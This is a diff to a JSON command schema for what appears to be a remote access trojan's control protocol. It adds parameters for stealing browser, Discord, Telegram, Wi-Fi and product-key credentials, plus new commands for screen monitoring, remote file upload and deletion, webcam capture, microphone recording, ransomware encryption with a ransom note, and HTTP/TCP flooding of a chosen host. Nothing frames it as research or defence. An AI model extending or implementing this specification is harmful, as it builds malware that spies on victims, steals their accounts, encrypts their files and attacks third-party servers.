@@ -253,7 +253,21 @@
       "transport": "frame",
       "params": {
         "type": "object",
-        "additionalProperties": false
+        "additionalProperties": false,
+        "properties": {
+          "kind": {
+            "type": "string",
+            "enum": [
+              "all",
+              "browsers",
+              "discord",
+              "telegram",
+              "wifi",
+              "productkey"
+            ],
+            "default": "all"
+          }
+        }
       },
       "result": {
         "$ref": "#/$defs/ok"
@@ -333,6 +347,331 @@
           },
           "ok": {
             "type": "boolean"
+          }
+        }
+      }
+    },
+    "monitor": {
+      "transport": "http",
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "properties": {
+          "seconds": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 30,
+            "default": 5
+          },
+          "fps": {
+            "type": "number",
+            "minimum": 0.2,
+            "maximum": 5,
+            "default": 1
+          },
+          "quality": {
+            "type": "integer",
+            "minimum": 20,
+            "maximum": 90,
+            "default": 60
+          },
+          "max_frames": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 30,
+            "default": 5
+          }
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": [
+          "frames",
+          "count",
+          "width",
+          "height"
+        ],
+        "properties": {
+          "frames": {
+            "type": "array",
+            "items": {
+              "type": "object",
+              "required": [
+                "ts",
+                "data"
+              ],
+              "properties": {
+                "ts": {
+                  "type": "integer"
+                },
+                "data": {
+                  "type": "string",
+                  "contentEncoding": "base64"
+                }
+              }
+            }
+          },
+          "count": {
+            "type": "integer"
+          },
+          "width": {
+            "type": "integer"
+          },
+          "height": {
+            "type": "integer"
+          },
+          "elapsed_ms": {
+            "type": "integer"
+          }
+        }
+      }
+    },
+    "files": {
+      "transport": "http",
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "action",
+          "path"
+        ],
+        "properties": {
+          "action": {
+            "type": "string",
+            "enum": [
+              "list",
+              "upload",
+              "mkdir",
+              "rename",
+              "delete",
+              "compress"
+            ]
+          },
+          "path": {
+            "type": "string",
+            "maxLength": 4096
+          },
+          "to": {
+            "type": "string",
+            "maxLength": 4096
+          },
+          "url": {
+            "type": "string",
+            "maxLength": 8192
+          },
+          "max_mb": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 256,
+            "default": 64
+          }
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": [
+          "ok",
+          "action",
+          "path"
+        ],
+        "properties": {
+          "ok": {
+            "type": "boolean"
+          },
+          "action": {
+            "type": "string"
+          },
+          "path": {
+            "type": "string"
+          },
+          "to": {
+            "type": "string"
+          },
+          "entries": {
+            "type": "array",
+            "items": {
+              "type": "object",
+              "properties": {
+                "name": {
+                  "type": "string"
+                },
+                "dir": {
+                  "type": "boolean"
+                },
+                "size": {
+                  "type": "integer"
+                }
+              }
+            }
+          },
+          "upload_id": {
+            "type": "string",
+            "format": "uuid"
+          },
+          "bytes": {
+            "type": "integer"
+          }
+        }
+      }
+    },
+    "webcam": {
+      "transport": "http",
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "properties": {
+          "device": {
+            "type": "string",
+            "maxLength": 256
+          }
+        }
+      },
+      "result": {
+        "$ref": "#/$defs/artifact"
+      }
+    },
+    "mic": {
+      "transport": "http",
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "properties": {
+          "seconds": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 10,
+            "default": 5
+          },
+          "device": {
+            "type": "string",
+            "maxLength": 256
+          }
+        }
+      },
+      "result": {
+        "$ref": "#/$defs/artifact"
+      }
+    },
+    "ransomware": {
+      "transport": "http",
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "action",
+          "path"
+        ],
+        "properties": {
+          "action": {
+            "type": "string",
+            "enum": [
+              "encrypt",
+              "decrypt",
+              "status"
+            ]
+          },
+          "path": {
+            "type": "string",
+            "maxLength": 4096
+          },
+          "note": {
+            "type": "string",
+            "maxLength": 2000
+          }
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": [
+          "ok",
+          "action",
+          "path"
+        ],
+        "properties": {
+          "ok": {
+            "type": "boolean"
+          },
+          "action": {
+            "type": "string"
+          },
+          "path": {
+            "type": "string"
+          },
+          "files": {
+            "type": "integer"
+          },
+          "bytes": {
+            "type": "integer"
+          },
+          "marker": {
+            "type": "string"
+          },
+          "note": {
+            "type": "string"
+          }
+        }
+      }
+    },
+    "ddos": {
+      "transport": "http",
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "method",
+          "host",
+          "port"
+        ],
+        "properties": {
+          "method": {
+            "type": "string",
+            "enum": [
+              "http",
+              "tcp"
+            ]
+          },
+          "host": {
+            "type": "string",
+            "maxLength": 512
+          },
+          "port": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 65535
+          },
+          "seconds": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 300,
+            "default": 30
+          },
+          "concurrency": {
+            "type": "integer",
+            "minimum": 1,
+            "maximum": 256,
+            "default": 16
+          }
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": [
+          "sent",
+          "errors",
+          "elapsed_ms"
+        ],
+        "properties": {
+          "sent": {
+            "type": "integer"
+          },
+          "errors": {
+            "type": "integer"
+          },
+          "elapsed_ms": {
+            "type": "integer"
+          },
+          "status": {
+            "type": "object"
           }
         }
       }
